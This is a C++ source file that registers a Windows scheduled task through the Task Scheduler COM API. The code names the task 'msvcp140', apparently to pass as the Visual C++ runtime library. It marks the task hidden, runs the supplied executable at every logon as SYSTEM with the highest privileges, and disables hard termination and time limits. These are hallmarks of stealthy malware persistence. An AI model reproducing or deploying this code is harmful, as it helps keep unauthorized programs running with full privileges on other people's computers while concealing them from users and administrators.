#include "AdminStartupItem.hpp"

#include <error_message_macro.hpp>
#include <Win32ErrorMessage.hpp>
#include <Windows.h>

// Include Windows libraries required for creating a task
#include <taskschd.h>
#include <comdef.h>
#include <comip.h>
#include <comdefsp.h>
#include <comutil.h>

#include <filesystem>
#include <sstream>
#include <stdexcept>

void AdminStartupItem::Create(std::wstring executable_path)
{
    // Create a task that should be called "msvcp140" in the root folder "Task Scheduler Library"
    // Schedule a task to run on login of any user.
    // The task will run with the highest privilages.
    // The task will run whether the user is logged-in or not (will not store credentials).
    // Configure the task for Windows 10
    // Make the task hidden
    // Get the task service
    
    // Use XML to create the task
    std::wstringstream task_xml;
    task_xml << L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">";
    task_xml << L"    <RegistrationInfo>";
    task_xml << L"        <Date>2020-01-01T00:00:00</Date>";
    task_xml << L"        <Author>Author</Author>";
    task_xml << L"    </RegistrationInfo>";
    task_xml << L"    <Triggers>";
    task_xml << L"        <LogonTrigger>";
    task_xml << L"            <Enabled>true</Enabled>";
    task_xml << L"        </LogonTrigger>";
    task_xml << L"    </Triggers>";
    task_xml << L"    <Principals>";
    task_xml << L"        <Principal id=\"Author\">";
    task_xml << L"            <UserId>S-1-5-18</UserId>";
    task_xml << L"            <LogonType>InteractiveToken</LogonType>";
    task_xml << L"            <RunLevel>HighestAvailable</RunLevel>";
    task_xml << L"        </Principal>";
    task_xml << L"    </Principals>";
    task_xml << L"    <Settings>";
    task_xml << L"        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>";
    task_xml << L"        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>";
    task_xml << L"        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>";
    task_xml << L"        <AllowHardTerminate>false</AllowHardTerminate>";
    task_xml << L"        <StartWhenAvailable>false</StartWhenAvailable>";
    task_xml << L"        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>";
    task_xml << L"        <IdleSettings>";
    task_xml << L"            <StopOnIdleEnd>true</StopOnIdleEnd>";
    task_xml << L"            <RestartOnIdle>false</RestartOnIdle>";
    task_xml << L"        </IdleSettings>";
    task_xml << L"        <AllowStartOnDemand>true</AllowStartOnDemand>";
    task_xml << L"        <Enabled>true</Enabled>";
    task_xml << L"        <Hidden>true</Hidden>";
    task_xml << L"        <RunOnlyIfIdle>false</RunOnlyIfIdle>";
    task_xml << L"        <WakeToRun>false</WakeToRun>";
    task_xml << L"        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>";
    task_xml << L"        <Priority>7</Priority>";
    task_xml << L"    </Settings>";
    task_xml << L"    <Actions Context=\"Author\">";
    task_xml << L"        <Exec>";
    task_xml << L"            <Command>" << executable_path << L"</Command>";
    task_xml << L"        </Exec>";
    task_xml << L"    </Actions>";
    task_xml << L"</Task>";

    // Create the task
    ITaskService* pService = nullptr;
    ITaskFolder* pRootFolder = nullptr;
    ITaskDefinition* pTask = nullptr;
    IRegisteredTask* pRegisteredTask = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr))
    {
        throw std::runtime_error(ERROR_MESSAGE("Failed to create task service"));
    }
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        throw std::runtime_error(ERROR_MESSAGE("Failed to connect to task service"));
    }
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        throw std::runtime_error(ERROR_MESSAGE("Failed to get root folder"));
    }
    // Create the task from the xml
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr))
    {
        throw std::runtime_error(ERROR_MESSAGE("Failed to create new task"));
    }
    hr = pTask->put_XmlText(_bstr_t(task_xml.str().c_str()));
    if (FAILED(hr))
    {
        throw std::runtime_error(ERROR_MESSAGE("Failed to set task xml"));
    }
    // Register the task
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(L"msvcp140"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_NONE, _variant_t(L""), &pRegisteredTask);
    if (FAILED(hr))
    {
        throw std::runtime_error(ERROR_MESSAGE("Failed to register task"));
    }
    // Clean up
    if (pRegisteredTask)
    {
        pRegisteredTask->Release();
    }
    if (pTask)
    {
        pTask->Release();
    }
    if (pRootFolder)
    {
        pRootFolder->Release();
    }
    if (pService)
    {
        pService->Release();
    }
}
    

AdminStartupItem::AdminStartupItem() = default;
AdminStartupItem::~AdminStartupItem() = default;
